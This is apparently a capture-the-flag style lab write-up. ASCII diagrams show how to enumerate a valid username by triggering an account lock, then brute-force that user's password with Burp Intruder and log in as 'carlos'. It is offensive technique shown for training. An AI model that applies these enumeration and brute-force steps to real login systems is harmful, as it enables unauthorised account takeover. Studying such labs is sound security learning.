Lab#9 Username enumeration via account lock

================================================================================
          LAB: USERNAME ENUMERATION VIA ACCOUNT LOCK (VISUALS)
================================================================================

[ ATTACK 1 ] ---> Enumerate username using account lock trigger
[ ATTACK 2 ] ---> Brute-force the password for the enumerated user

--------------------------------------------------------------------------------
ATTACK 1: USERNAME ENUMERATION (Cluster Bomb + Null Payloads)
--------------------------------------------------------------------------------

  Burp Intruder                      Web Server               Response Status
                                     (Flawed Lock Logic)      & Length

    |                                    |
    |-- POST /login -------------------->|
    |   username=alice & password=x      | ---> [Invalid user] -> 200 OK (Short)
    |   (Repeat 5 times)                 |
    |                                    |
    |-- POST /login -------------------->|
    |   username=bob & password=x        | ---> [Invalid user] -> 200 OK (Short)
    |   (Repeat 5 times)                 |
    |                                    |
    |-- POST /login -------------------->|
    |   username=carlos & password=x     | ---> [Valid User!]  -> 200 OK (Short)
    |   (Attempts 1 to 4)                |
    |                                    |
    |-- POST /login (5th Attempt) ------>|
    |   username=carlos & password=x     | ---> [LOCK TRIGGERED] -> 200 OK (LONGER)
    |                                    |       "Too many incorrect attempts"
    |                                    |
    
    [CRITICAL FINDING]: Carlos is a valid user because the account locked!

--------------------------------------------------------------------------------
ATTACK 2: PASSWORD BRUTE-FORCE (Sniper Attack + Grep Match)
--------------------------------------------------------------------------------

  *WAIT 1 MINUTE FOR ACCOUNT LOCK TO RESET BEFORE RUNNING*

  Burp Intruder                      Web Server               Grep Match Column
                                                              (Error Messages)

    |                                    |
    |-- POST /login -------------------->|
    |   username=carlos                  |
    |   password=§pass1§                 | ---> [Wrong Pass]  -> "Invalid password"
    |                                    |
    |-- POST /login -------------------->|
    |   username=carlos                  |
    |   password=§pass2§                 | ---> [Wrong Pass]  -> "Invalid password"
    |                                    |
    |-- POST /login -------------------->|
    |   username=carlos                  |
    |   password=§correct_pass§          | ---> [SUCCESS]     -> [ BLANK / NO ERROR ]
    |                                    |                       (302 Redirect)

--------------------------------------------------------------------------------
FINAL STEP: LOG IN AND SOLVE
--------------------------------------------------------------------------------

  Browser                            Web Server

    |                                    |
    |-- POST /login -------------------->|
    |   carlos : correct_pass            |
    |                                    |<-- 302 Redirect to /my-account ----|
    |<-- Page Loads ---------------------|
    |                                    |
    |   *** LAB SOLVED ***               |
================================================================================
